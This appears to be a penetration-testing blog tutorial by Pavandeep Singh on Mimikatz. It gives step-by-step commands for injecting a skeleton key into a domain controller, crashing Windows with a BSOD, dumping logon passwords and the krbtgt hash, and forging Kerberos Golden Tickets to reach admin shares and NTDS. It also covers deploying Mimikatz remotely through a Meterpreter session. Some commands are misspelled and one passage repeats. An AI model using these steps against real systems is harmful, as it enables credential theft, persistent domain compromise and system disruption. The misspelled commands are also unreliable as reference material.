@@ -1,0 +1,114 @@
+
+Understanding Guide to Mimikatz
+
+Mimikatz is a Tool made in C Language by Benjamin Delpy. It is a great tool to extract plain text passwords, hashes and Kerberos Tickets from Memory. It can also be used to generate Golden Tickets.
+You can get Mimikatz In ZIP from here. Or you can build it for git from here.
+Mimikatz comes in 2 architectures: x32 and x64. Here is a screenshot of the x64 mimikatz bash.
+
+Victim: Windows Server 2012 R2 (Domain Controller)
+Attacker: Mimikatz (On Windows Server 2012 R2)
+In this attack, what mimikatz installs the patch on the Domain Controller to accept “mimikatz” as a new logon password? It can be thought as a Master Key which will open the Active Directory to the attacker. This attack can be performed as shown below.
+First, I will try to logon on my Server using mimikatz as a password.
+
+As you can see clearly that we cannot logon into server using ‘mimikatz’ as a password.
+
+Now I will login the server using its password which is ‘T00r’.
+
+And as you can see below I have logged in the Server using the correct password
+
+If you ever are logged in on a server or have a server unlocked, you can create a skeleton key to be stored inside the memory of the Server by using Mimikatz.
+Launch the Mimikartz Terminal according to the architecture of the server (x32, x64). Now first we will get the Debuging privilege in Mimikatz using
+Command: privilege::debug
+And then we will inject the mimikatz skeleton key in the memory of server using
+Command: misc::skeleton
+With this we have our skeleton key successfully injected on the server.
+Note: You will have to open mimikatz with Administrative Privilege to create a Skeleton Key.
+
+Now I will try to login the server using the skeleton key “mimikatz” we just injected in the memory. Remember last time we tried to login the server using mimikatz as a password we were unsuccessful.
+
+But this time ‘mimikatz’ was accepted as a password. This does not mean that we reset the original password ‘T00r’. The server will continue to login using ‘T00r’ but now it will also accept ‘mimikatz’ as a password too.
+Now, remember that we injected the skeleton key in the memory, not in storage so the next time that admin restarts the server we will lose the access. So the best way to protect your Domain Controller from Skeleton Key is a practice of restarting the Server Frequently or prevents mimikatz from accessing the memory.
+
+Attacker: Mimikatz (on Windows 7)
+Victim: Windows 7
+We can perform a Blue Screen of Death or bsod attack using mimikatz. This shows how powerful this tool is.  To perform the bsod on a System follow the steps mentioned below:
+Command: !+
+
+Now Initiate the Bsod as given below in the following command.
+Command: !bsod
+
+As you can see below we have the Blue Screen of Death Error
+Note: This attack can corrupt data and potentially harm the system. Use Carefully !!
+
+You can extract hostname of the Victim System by typing hostname in the mimikatz Terminal.
+Command: hostname
+We have extracted the hostname of system as Pavan-pc
+
+Attacker: Mimikatz on Windows Server 2012 R2
+Victim: Windows Server 2012 R2
+To Generate a Golden Ticket, we will require the following information:
+Let’s get the Domain First.
+To get the Domain we will run the ipconfig /all from the Command Line or PowerShell
+
+
+Now we will mimikatz itself to extract the ntml hash required to generate the Ticket.
+First we will get the Debugging Privilege using following command given below.
+Command: privilege::debug
+And now to extract hashses we will run following command given below.
+Command: selurlsa::logonpasswords
+
+And now we have it all that we need to generate the Ticket.
+Syntax: kerbros::golden /domain:[Domain] /sid:[SID] /rc4:[NTLM Hash] /user:[Username To Create] /id:500 /ptt
+Command: kerbros::golden /domain:PAVAN.LOCAL /sid:S-1-5-21-1118594253-693012904-2765600535 /rc4:9a7a6f22651d6a0fcc6e6a0c723c9cb0 /user:hacker /id:500 /ptt
+Here I am creating the golden key for a user named ‘hacker’; you can use any of the existing users of the Domain or create a new one.
+I am using [/ppt] option to pass the ticket in the current session.
+
+Now run command prompt to the access of Share Folder and execute given below command:
+pushd \\WINSERVER01\c$
+Now we are in Z: drive execute given below command for NT directory services
+cd WINDOWS\NTDS
+DIR
+As you can see that we get the access to the share folder which cannot be accessed without Admin Access but we had obtained it without using CMD as administrator. From given below image you can observe that it is showing 8 file and 2 folder.
+
+Attacker: Kali
+Victim: Windows Server 2012 R2
+Firstly get a Meterpreter Access of the Server which you can learn from here
+
+Once gaining the meterpreter upload the mimikatz folder to the victim system using the command
+Command: upload  -r /root/Desktop/mimi c:\
+Remember to use -r so that upload command uploads recursively.
+
+Open the shell and extract Domain using ipconfig /all
+
+And SID using the whoami /user
+
+Now go to the location where we uploaded the mimikatz earlier and run mimikatz.exe as shown below
+
+Now let’s extract the krbtgt NTLM hash using the following command
+Command: lsadump::lsa /inject /name:krbtgt
+
+Now using all the information extracted lets generate a golden ticket in the same way we did above.
+Command:  kerberos::golden /domain:pavan.loc /sid:S-1-5-21-97841242-3460736137-492355079 /rc4:e847d2e54044172830e3e3a6b8438853 /user:Hacker /id:500 /ptt
+
+Now let’s take the access of Share Folder and as you can see that we get the access to the share folder which cannot be accessed without Admin Access.
+Hence we successfully generated a golden ticket in a Windows Server Remotely via Kali
+
+Now let’s take the access of Share Folder and as you can see that we get the access to the share folder which cannot be accessed without Admin Access.
+Hence we successfully generated a golden ticket in a Windows Server Remotely via Kali
+
+We all have played Minesweeper Game, and it is tough to get all the mines right but those days of worry are over. To show that the Mimikatz is a powerful but a playful Tool, here I will hack the minesweeper game using Mimikatz.
+Firstly open Mimikatz of your respective architecture.
+
+And then open the Minesweeper Game
+
+To load minesweeper in the mimikatz by using
+Command: minesweeper::infos
+You can see in the above screenshot that that minesweeper grid is shown in the mimikarz shell.
+
+Now click on any Random block on the Minsweeper.
+
+Now run the previous command again and now we have locations of mine on the grid.
+
+You can verify this image with the One with Mimikatz shell.
+
+Author: Pavandeep Singh is a Technical Writer, Researcher and Penetration Tester Contact here
